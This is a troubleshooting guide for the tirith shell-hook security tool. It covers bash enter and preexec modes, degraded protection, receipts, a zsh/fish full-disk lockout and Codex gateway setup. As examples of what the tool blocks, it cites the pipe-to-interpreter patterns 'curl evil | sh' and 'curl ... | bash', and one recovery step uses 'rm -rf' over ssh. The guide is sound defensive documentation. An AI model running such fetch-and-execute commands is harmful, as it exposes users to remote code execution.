# Troubleshooting

## Shell hooks not loading

Run `tirith doctor` to see the hook directory being used and whether hooks were materialized from the embedded binary.

For a focused, single-screen compatibility view — detected shell, requested-vs-effective bash mode, install checks (PATH shadowing, profile wiring, materialized-hook staleness, policy discovery, threat-DB status), and any co-installed shell tools that interact with hooks (Atuin, Starship, fzf, zoxide, direnv, mise, asdf) — run:

```
tirith doctor --compat
```

Add `--format json` for a machine-readable report. `--compat` is a static report; to (re)measure bash enter-mode delivery use `tirith doctor --simulate-enter`.

If hooks are not found:
1. Ensure `tirith` is in your PATH when the hook is sourced. Bash, zsh, and
   fish resolve and pin that executable for the lifetime of the shell session.
2. Run `eval "$(tirith init)"` and check for error messages (if you use multiple shells, prefer `tirith init --shell bash|zsh|fish`)
3. Set `TIRITH_SHELL_DIR` to point to your shell hooks directory explicitly

## Filing a bug report: `tirith doctor --bundle`

To attach a complete, **redacted** diagnostic to a bug report, run:

```
tirith doctor --bundle
```

It writes a single text file (path printed on completion, under
`~/.local/state/tirith/`) containing the doctor info, tirith and hook
versions, shell / mode / effective protection, hook-chain state, policy
discovery, threat-DB status, and a curated slice of the environment. The
aliases `tirith doctor --redacted-report` and `tirith doctor --shell-trace`
produce the same file.

The bundle is **redacted by design**:

- Only a curated allowlist of tirith-relevant environment variables is
  included — unrelated cloud credentials and API keys are never even
  candidates.
- Any value that still looks like a token or secret is masked as
  `<redacted>`.
- The literal home-directory path is replaced with `~`, so absolute paths in
  the report do not reveal your username.

It is safe to attach to a public issue. Review it first if you want to be
sure. Add `--format json` to get `{"bundle_path": "..."}` instead of the
human summary.

## Protection downgraded (`degraded` status)

tirith can downgrade protection during a session — most commonly bash enter
mode falling back to preexec warn-only when it detects a delivery failure. A
downgrade is **never silent**: the hook prints one consolidated message,

```
tirith: protection downgraded to warn-only (does not block) — run 'tirith doctor' for details
```

and updates the `TIRITH_STATUS` shell variable to `degraded`.

To see the current protection level at any time, run `tirith doctor` — a
`protection:` line reports `blocks` / `warn-only` / `degraded` / `off`, and a
`degraded` state gets an explicit callout. `tirith doctor --compat` shows a
`protection status:` line in the same spirit.

If you want the protection level visible in your shell prompt, the hook sets a
non-exported `TIRITH_STATUS` shell variable for exactly that — see
[`docs/prompt-status.md`](prompt-status.md) for ready-to-paste prompt snippets
for bash, zsh, fish, PowerShell, and Starship. tirith adds no per-prompt
output of its own; wiring `TIRITH_STATUS` into a prompt is opt-in.

To recover full protection after a degrade, restart your shell (and see
"Persistent safe mode" below if it keeps happening).

## Execution receipts unavailable or degraded

Strict protocol-v3 receipts are available only to interactive bash, zsh, and
fish hooks. Each live shell process registers once, and the capability is bound
to that process and start identity, shell family, session ID, effective user,
and the pinned Tirith executable identity. Nested shells register independently
even when they inherit the same session ID. Do not export or manually set any
`_TIRITH_RECEIPT_*` variable.

If the hook reports that receipts are unavailable, start a fresh shell after
fixing PATH or upgrading/replacing Tirith. Re-sourcing into the same live shell
process is not a recovery path: duplicate process registration deliberately
returns no bearer. In particular, an `exec`-replacement shell keeps the same
PID/start identity but loses the deliberately non-exported bearer, so start a
fresh terminal or child shell to recover strict receipts; `exec "$SHELL"` is
not a receipt-protocol restart. PowerShell remains a PSReadLine preflight gate
and intentionally has no
strict receipt channel. Even when a bash/zsh/fish receipt commits, it records a
conservative shell-boundary observation, not proof that every component of a
compound command executed.

## Known issue: a full disk locks a zsh or fish shell out of every command

**Who this affects.** zsh and fish. Bash is not affected: on the same failure it
calls `_tirith_degrade_to_preexec` and keeps working in warn-only mode
(`shell/lib/bash-hook.bash:1270-1276`). PowerShell has no strict receipt channel
and is not affected either.

**Symptom.** Every command you press Enter on is refused with

```
tirith: secure execution-receipt capture unavailable; command blocked
```

and every paste is refused with

```
tirith: secure paste capture unavailable; paste blocked for safety
```

You cannot run anything at all, including a command that would free space.

Both messages are word-for-word identical under zsh and fish. Fish has one
additional variant on its preflight path:

```
tirith: secure preflight capture unavailable; command blocked
```

**Cause.** The hook creates a scratch capture file through `mktemp` BEFORE it
runs the tirith binary, and fails closed when that fails. A full or read-only
`TMPDIR` makes `mktemp` fail, so the block happens without the binary ever being
consulted.

- zsh: `shell/lib/zsh-hook.zsh:275` and `:315` for the accept-line widget,
  `:539` and `:556` for the bracketed-paste widget.
- fish: `_tirith_v3_new_capture_file` (`shell/lib/fish-hook.fish:206-217`)
  returns 1, and both the protocol-v3 and legacy branches then block
  (`:403` and `:426`); the paste widget does the same at `:325`. Unlike bash,
  fish has no degrade path.

Failing closed is right for an ANALYSIS failure. It is the wrong answer for an
INFRASTRUCTURAL one: a full disk is not an attack, and it is indistinguishable
from one here only because the hook cannot tell the two apart.

**The documented `TIRITH=0` bypass does not help.** That bypass is honoured
inside the binary (`crates/tirith/src/cli/check.rs`), and the binary is never
reached. There is also no keystroke recovery, because restoring the original
widget requires pressing Enter, which is the blocked path.

**Recovery.** The hooks only run inside the shell's interactive line editor, so
anything that executes a command without going through one still works. In rough
order of convenience:

1. From another machine, `ssh <host> 'rm -rf <large-path>'`. A non-interactive
   `ssh host 'command'` never installs the hook.
2. Configure your terminal profile to launch a shell that reads no rc file, so
   the hook is never sourced: `zsh -f`, `fish --no-config` (equivalently
   `fish -N`), or `bash --norc --noprofile`. Then free space from there.
3. Use a file manager, an editor's built-in task runner, or any GUI application
   to delete files.

Once one command can run, free space and the shell returns to normal
immediately; nothing persistent was changed.

**Prevention.** Keep `TMPDIR` on a filesystem with headroom, and treat a
disk-space alert on a workstation as an availability issue for the shell itself.

This is a defect in shipped hook code rather than in any particular release, and
it is recorded here so an operator who hits it is not stranded.

## Brew upgrade applied but behavior did not change

If `brew` reports a newer version but `tirith --version` is older, or shell behavior looks unchanged:

```bash
which -a tirith
brew info tirith
hash -r
```

Then refresh materialized hooks and restart shell:

```bash
rm -rf ~/.local/share/tirith/shell
exec zsh   # or exec bash / restart terminal
```

## Wrong `tirith` binary on PATH

An unrelated Python package named `tirith` exists on PyPI. If an AI agent or script runs `pip install tirith`, that package lands in `~/.local/bin/tirith` and may shadow the Rust binary.

Symptoms: `tirith init` produces a Python traceback mentioning `autobahn`, `asyncio`, or `tirith monitor`.

`tirith doctor` and `tirith init` will warn automatically if they detect a conflicting binary. To check manually:

```bash
which -a tirith        # list all tirith binaries on PATH
file $(which tirith)   # should say "Mach-O" or "ELF", not "Python script"
```

Fix: remove the Python package and clear the shell hash:

```bash
pip uninstall tirith
hash -r
```

Then restart the shell. An already-loaded bash, zsh, or fish hook keeps using
the absolute executable it pinned when it was sourced; changing PATH or only
clearing the command hash does not rebind that running hook.

## Bash: Enter mode vs preexec mode

tirith supports two bash integration modes:
- **enter mode**: Binds to Enter key via `bind -x`. Intercepts commands and paste before execution. Includes startup health gate and runtime self-healing that auto-degrade to preexec if failures are detected.
- **preexec mode**: Uses a phase-aware `DEBUG` trap. Warn-only by default. With `TIRITH_BASH_PREEXEC_ENFORCE=1`, it scans one trustworthy typed line and enables Tirith-owned `extdebug` only when that decision must be blocked.

### Which mode is used by default

`bind -x` on Enter does not reliably accept the typed line in every bash /
readline build — in some environments it runs the bound function but never
returns to the command loop, so the command is silently eaten (issue #111).
Because this is a property of the bash build, not the version number, tirith
**proves it** rather than guessing:

- `tirith setup` and `tirith doctor` run a quick disposable-PTY **self-test**
  that checks whether enter-mode delivery and blocking actually work for your
  bash, and cache the verdict. `tirith doctor --simulate-enter` runs it on
  demand.
- On every new interactive shell, the bash hook reads that cached verdict. It
  uses enter mode **only when the self-test proved it works**; otherwise it
  falls back to preexec (warn-only). Outside SSH and with no cached verdict
  yet, the hook starts in preexec until the next `tirith setup` / `tirith
  doctor` populates the cache.

`tirith doctor` shows the cached verdict on the `enter capability:` line. If it
reports `not tested`, run `tirith doctor --simulate-enter`.

Set the mode explicitly with `export TIRITH_BASH_MODE=enter` or `export
TIRITH_BASH_MODE=preexec` (before `tirith init` in your shell rc).
`TIRITH_BASH_MODE=enter` is a deliberate override — it forces enter mode even
when the self-test has not proven it works; the startup health gate and runtime
self-healing still degrade visibly to preexec if delivery then fails.

### Preexec enforcement (`TIRITH_BASH_PREEXEC_ENFORCE`)

Set `export TIRITH_BASH_PREEXEC_ENFORCE=1` in your `.bashrc` (before `tirith init`) to get real blocking in preexec mode. Values `1`, `true`, `yes`, `on` all enable it; unset or `0` keeps today's warn-only behavior.

Enforcement needs a trustworthy whole-line view of each typed command, which bash provides through `history 1`. A few common bash settings break that guarantee, and the hook refuses to engage enforcement in those shells — it stays in warn-only and prints the reason once at startup. Specifically:

| Setting | Effect | Why enforcement cannot use it |
|---|---|---|
| `HISTCONTROL` containing `ignorespace`, `ignoredups`, or `ignoreboth` | Bash skips or merges history entries | `history 1` may return a stale line that no longer matches `BASH_COMMAND` |
| `HISTIGNORE=...` | Matching commands are dropped from history | Same: a drifted entry would let composite rules like `curl \| sh` slip |
| `set +o history` | No entries recorded at all | Nothing to check against |
| readonly, associative, coercing/nameref, otherwise unassignable `PROMPT_COMMAND`, or an array on Bash < 5.1 | Tirith cannot bracket prompt execution safely without mutating user-owned state | Tirith preserves `PROMPT_COMMAND` and the caller's DEBUG trap, reports protection `off`, and installs no preexec interception |
| user-enabled `extdebug` | The `DEBUG` trap is inherited into functions and substitutions | Tirith preserves user debugger state, reports protection `off`, and installs no preexec interception |

Filtered/disabled history leaves a visible warn-only downgrade with the specific reason, for example:

```
tirith: protection downgraded to warn-only (does not block) — run 'tirith doctor' for details
  preexec enforcement could not engage (...). For guaranteed blocking, use enter mode (export TIRITH_BASH_MODE=enter).
```

Unsafe prompt/debugger ownership instead prints that the preexec hook was not installed and exports protection `off`; it never calls that state warn-only. Remove the hostile setting or use enter mode, then start a new shell.

#### What Phase 1 handles vs what it doesn't

Phase 1 enforcement uses a narrow-but-honest drift check: bash's `BASH_COMMAND` (the current simple command) must word-boundary-match somewhere inside `history 1` (the typed line). Cosmetic spacing differences — `ls -l >/dev/null` vs `ls -l > /dev/null` — are bridged by a whitespace-normalised retry and a command-name fallback, so they do **not** trigger drift.

Startup, prompt, and user-command execution are tracked as separate phases. Tirith brackets an existing scalar `PROMPT_COMMAND`, or an indexed array on Bash 5.1+, without reordering its entries and preserves the previous command's status for the first user prompt function. The sourced hook reports protection `off` until the first internal prompt boundary captures any caller-owned DEBUG trap in Bash's top-level context, chains it, and activates preexec (`warn-only`, or `blocks` when enforcement was requested) before Bash can accept another user command; prompt execution and receipt generation remain excluded during that bootstrap. Older Bash versions do not execute every `PROMPT_COMMAND` array element, so Tirith preserves such an array unchanged and leaves interception visibly off instead of installing a begin guard that can never reach its end guard. A typed function call is decided once at its top-level history line; inherited `DEBUG` fires from its body, prompt functions, substitutions, and subshells neither rescan nor create duplicate execution receipts. A function definition and invocation typed on the same line is therefore checked as that complete line. Pre-existing function bodies are not recursively converted back into shell source for a second scan; use enter mode if policy must reason about indirection that is absent from the accepted line itself.

If a prompt framework later removes or reorders Tirith's boundary entries, the
hook downgrades visibly and stops issuing trusted execution receipts for that
shell. History-matching commands continue under best-effort warn-only scans;
automatic prompt commands remain excluded. Start a new shell after fixing the
prompt configuration to restore blocking and receipt claims.

The following are explicitly **not** handled in Phase 1; any shell that relies on them triggers a runtime drift detection and downgrades the session to warn-only with a clear message:

- Alias expansion (`alias ll='ls -l'`; typing `ll ...` expands to `ls -l ...` which no longer matches the typed line)
- Process substitution (`diff <(...) <(...)`)
- Command substitution (`foo "$(bar)"`)
- `eval`'d strings

If you use any of these heavily, prefer enter mode for guaranteed blocking.

#### Known residual: late drift on filtered shells

If the install-time check passed but drift develops mid-session (e.g. the user switched to `HISTCONTROL=ignorespace` after sourcing), the hook detects it on the next DEBUG fire and downgrades to warn-only. The drift-triggering command is blocked, the session flips, and the rest of the *same typed line* is also blocked because the cache key is `BASH_LINENO[0]` (a per-typed-line identifier) — not `history 1`'s entry index, which can stall in filtered shells. Subsequent prompts get a fresh evaluation under warn-only.

One narrow residual remains: if a pipeline's *first* simple command happens to word-boundary-match the stale history line AND that stale line's verdict is allow, the first segment runs before drift is noticed on a later segment. The later segment is then blocked and the session is downgraded. In a pipe-to-interpreter attack (`curl evil | sh`), `curl` may fetch the payload but `sh` does not run it; the downstream sink is still blocked. Use enter mode if you need guaranteed line-level blocking.

#### `extdebug` side effects

Tirith no longer leaves `extdebug` enabled for an enforced session. Allowed
lines and prompt functions run with the user's original setting. Only after a
whole-line block verdict does Tirith temporarily run `shopt -s extdebug`, so
the `DEBUG` trap's non-zero return can skip the command; the prompt-begin guard
then disables Tirith-owned `extdebug` before any user `PROMPT_COMMAND` entry.

During that short blocked-line interval, `extdebug` can:

- Change the default behavior of `BASH_ARGC` / `BASH_ARGV` (they become populated by default).
- Make `declare -F` include source file and line numbers.
- Interact with `set -E` (errtrace) so `ERR` traps are inherited by shell functions.

If `extdebug` is already enabled when the hook loads, Tirith leaves it enabled and visibly leaves preexec interception off rather than claiming or later disabling user debugger state. If prompt code enables it after enforcement starts, the prompt-end boundary detects that before another user command, preserves the setting, downgrades to warn-only, and stops trusted receipt claims. If Tirith cannot attach and retain its prompt guards or safely capture a caller-owned DEBUG trap, it likewise preserves that state and reports protection `off`. Use enter mode if the block-to-prompt `extdebug` interval conflicts with your debugging workflow.

### Chained DEBUG traps

If you have your own `DEBUG` trap installed before sourcing the tirith hook, the hook captures it from a direct first-prompt command (a sourced file cannot inspect its caller's DEBUG trap), then wraps it in a trampoline before the shell accepts more input. Both run on every command; the capture tolerates output from the existing trap and does not change `extdebug`. Source the hook as its own startup line: commands appended to the same manual `source ...; command` compound line occur before that first prompt and therefore predate preexec activation. Your trap's return value is ignored by the trampoline; tirith's return value is authoritative. If capture or chaining cannot be proven safe, Tirith leaves the existing trap untouched and reports interception `off`. If your trap depends on caller-local state, the wrap may not reproduce behavior perfectly — leave preexec mode disabled in that case.

### Checking live state with `tirith doctor`

`tirith doctor` reports bash state on two separate lines so requested configuration and live hook state are legible even when they disagree (e.g. after a mid-session degrade):

```
  requested mode:       preexec          ← from TIRITH_BASH_MODE env var
  requested enforce:    off              ← from TIRITH_BASH_PREEXEC_ENFORCE
  require-enter:        off              ← from TIRITH_BASH_REQUIRE_ENTER
  bash mode:            preexec          ← live, exported by the hook
  effective protection: warn-only        ← live, exported by the hook
  safe mode:            off              ← persistent enter-mode-failure flag
  enter capability:     broken           ← cached enter-mode self-test verdict
```

The `enter capability:` line shows the cached verdict of the bash enter-mode
delivery self-test (issue #111): `works` (enter mode is enabled for new
shells), `broken` / `inconclusive` (preexec is used), `STALE` (the verdict was
measured against a different bash — a different `$BASH_VERSION` or a different
bash binary path — so it no longer applies; run `tirith doctor
--simulate-enter` to re-measure), or `not tested`. Cache freshness tracks the
bash identity only; a tirith upgrade does not by itself make the verdict stale
(the cache `schema` number handles cross-version invalidation, and the
recorded tirith version is diagnostic only).

If you see `bash hook: not loaded in this process`, the hook did not run in the shell that invoked `doctor` — typically because `doctor` was called from a non-interactive subshell. Source the hook in your `.bashrc` and open a new interactive shell.

### First-use preexec banner

On the first command it intercepts in an interactive bash session, the preexec hook prints a one-line reminder:

```
tirith: bash is in preexec mode (warn-only, does not block)
  Run 'tirith doctor' to test enter mode (blocking) for this shell
```

This is intentional: preexec mode cannot stop a command once bash has committed to running it. The banner fires once per shell, on the first intercepted command. Running `tirith doctor` (or `tirith doctor --simulate-enter`) runs the enter-mode self-test and, if delivery works for your bash, enables enter mode for new shells.

### Persistent safe mode

If enter mode detects a failure (bind-x not taking effect, PROMPT_COMMAND delivery broken, etc.), it automatically degrades to preexec and writes a persistent flag at `~/.local/state/tirith/bash-safe-mode`. All subsequent shells will start in preexec until you explicitly re-enable enter mode.

To re-enable enter mode after an auto-degrade:

```bash
# Option 1: CLI reset
tirith doctor --reset-bash-safe-mode

# Option 2: explicit override in your .bashrc (before tirith init)
export TIRITH_BASH_MODE=enter
```

### DEBUG trap ownership

In preexec mode (including after auto-degrade from enter mode), tirith installs a `DEBUG` trap. This is the same behavior used by default in SSH sessions. A `DEBUG` trap you installed BEFORE sourcing the hook is not overridden: it is captured at the first prompt and chained, as described under "Chained DEBUG traps" above. A trap installed AFTER the hook replaces tirith's, and tirith does not take it back; it reports protection `off` at the next prompt and says which tool to load first. Run `tirith doctor` to see the live state.

## Bash: no visible input after `ssh` / `gcloud compute ssh`

tirith automatically defaults to preexec mode when `SSH_CONNECTION`, `SSH_TTY`, or `SSH_CLIENT` is set. If you still see input issues, force preexec explicitly:

```bash
export TIRITH_BASH_MODE=preexec
eval "$(tirith init --shell bash)"
```

This avoids `bind -x` enter interception in environments where PTY handling is fragile.

## PowerShell: PSReadLine conflicts

If using PSReadLine, ensure the tirith hook loads after PSReadLine initialization. The hook overrides `PSConsoleHostReadLine` to intercept pastes.
This is preflight interception only. Tirith does not claim a strict PowerShell
execution receipt because mutable PSReadLine history is not accepted as proof
that the command executed.

## Fish: clipboard paste scope

The fish hook intercepts pastes through `fish_clipboard_paste` (covering Ctrl+V and Ctrl+Y emacs/custom bindings), which is what the vast majority of fish users hit. It does **not** currently wrap fish's terminal-level bracketed-paste path (`__fish_paste`). If you rely on terminal-initiated bracketed paste and want it scanned too, use a shell with enter-mode support (bash 5+/zsh) for those sessions, or track the request in [issue #4](https://github.com/sheeki03/tirith/issues/4).

## Latency

tirith's Tier 1 fast path (no URLs detected) targets <2ms. If you notice latency:

1. Run `tirith check --format json -- "your command"` and check `timings_ms`
2. If Tier 1 is slow, check for extremely long command strings
3. Policy file loading (Tier 2) adds ~1ms. Use `tirith doctor` to see policy paths

## False positives

If a command is incorrectly blocked or warned:
1. Run `tirith why` to see which rule triggered
2. Add the URL to your allowlist: `~/.config/tirith/allowlist`
3. Override the rule severity in policy.yaml: `severity_overrides: { rule_id: LOW }`

## Policy discovery

tirith searches for policy in this order:
1. `TIRITH_POLICY_ROOT` env var → `$TIRITH_POLICY_ROOT/.tirith/policy.yaml` (or `.yml`)
2. Walk up from CWD looking for `.tirith/policy.yaml` (or `.yml`)
3. `~/.config/tirith/policy.yaml` (or `.yml`) (user-level)

Use `tirith doctor` to see which policy files are active.

## Warp terminal: silent blocking

Warp terminal handles `/dev/tty` output differently than traditional terminals. tirith auto-detects Warp and uses stderr instead, but if block/warn messages aren't showing:

```bash
# Add to your ~/.zshrc or ~/.bashrc
export TIRITH_OUTPUT=stderr
```

This forces tirith to output to stderr instead of `/dev/tty`, which Warp displays correctly.

## Codex: MCP protected, but direct shell commands still run

Symptom: MCP tool calls are blocked correctly, but a direct command like
`curl ... | bash` still executes in Codex.

Cause: Codex has two execution paths. MCP gateway covers MCP `tools/call`, but
native `/bin/zsh -lc` execution does not pass through MCP.

Fix: Follow `mcp/clients/codex.md` and ensure both are configured:
1. Codex MCP gateway registration (`codex mcp add ...`)
2. `~/.zshenv` guard for all non-interactive `zsh -lc` runs (`ZSH_EXECUTION_STRING`)

The recommended Codex guard is intentionally fail-closed: if `tirith check`
returns an unexpected non-zero code, the command is blocked for safety.

Then run:

```bash
scripts/codex-upgrade-smoke.sh --config ~/.config/tirith/gateway.yaml
```

If it reports unguarded tool names, add those names to `guarded_tools.pattern`
in your gateway YAML and rerun the script.

## Unexpected tirith exit codes

Tirith uses a **mixed fail-safe policy** for unexpected exit codes (crashes, OOM-kills, missing binary). The policy balances safety against terminal usability:

- **Bash enter mode**: Auto-degrades to preexec on unexpected tirith exit code. The current command is not executed; subsequent commands go through preexec warn-only mode. Recoverable via `tirith doctor --reset-bash-safe-mode` or `export TIRITH_BASH_MODE=enter`.
- **Zsh / Fish, negotiated receipt protocol v3**: An unexpected exit code or
  malformed response blocks the current command. Receipt capture, cleanup, or
  durable-commit failures also block, and unresolved evidence is never promoted
  to confirmed execution.
- **Zsh / Fish, legacy protocol-off fallback**: Warns and executes on an
  unexpected preflight exit code to preserve the historical terminal behavior.
  Expected legacy results still honor allow, block, warn, and warn-ack flows.
- **PowerShell**: Warns and executes on an unexpected preflight exit code. It
  has no strict receipt channel, so this behavior makes no post-execution proof
  claim.
- **All paste paths**: Fail-closed — discards paste on any unexpected exit code. Safe because you can re-paste.

Negotiated protocol v3 expects `0` (allow), `1` (block), or `2` (warn), plus
the exact receipt framing documented in `docs/shell-hook-conformance.md`.
The legacy Bash/Zsh/Fish approval flow additionally expects `3` (warn with
explicit acknowledgement). Anything else is treated as unexpected under the
mode-specific policy above.

## Audit log location

Default: `~/.local/share/tirith/log.jsonl` (XDG-compliant)

Each entry is a JSON line with timestamp, action, rule IDs, and redacted command.
